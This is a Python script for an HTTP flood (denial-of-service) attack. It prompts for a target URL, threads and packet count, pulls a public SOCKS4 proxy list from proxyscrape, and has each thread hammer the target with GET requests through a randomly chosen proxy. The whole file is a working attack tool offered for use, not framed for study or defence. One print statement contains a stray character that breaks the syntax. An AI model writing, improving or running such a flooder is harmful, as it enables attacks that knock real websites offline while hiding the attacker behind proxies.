#!/usr/bin/python3

import requests
import random
import time
import threading

def opth(): 
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("[!] Threads " + str(i+1) + " created")
	print("[!] Please wait a few seconds before launching the attack")
	time.sleep(3)
	input("Press enter to launch...")
	global on 
	on = True

on = False
def main():
	global pprr
	global list
	global proxy
	global url
	global pwr
	global thr
	global on
	url = str(input("[+] Target URL : "))
	thr = int(input("[+] Threads : "))
	cho = str(input("[+] Get fresh socks list? (y/n) : "))
	if cho =='y':
		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all') #Code By GogoZin
		with open('socks.txt','wb') as fp:
			fp.write(rsp.content)
			print("[!] Socks downloaded!")
	else:
		pass
	list = str(input("[+] Socks List (socks.txt): "))
	if list =="":
		list = 'socks.txt'
	else:
		list = str(list)
	pprr = open(list).readlines()
	print("[!] Total socks : " + "%d " %len(pprr))
	pwr = int(input("[!] Packets : "))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		while on:
			try:
				s.get(url)
				try:
					for y in range(pwr):
						s.get(url)
						print("[!] Flooding => [ " + str(proxy[0])+":"+str(proxy[1]) +" ] "E)
					s.close
				except:
					s.close()
			except:
				s.close()
				print("[!] Cant connect to the socks, skipping.")


if __name__ == "__main__":
	main()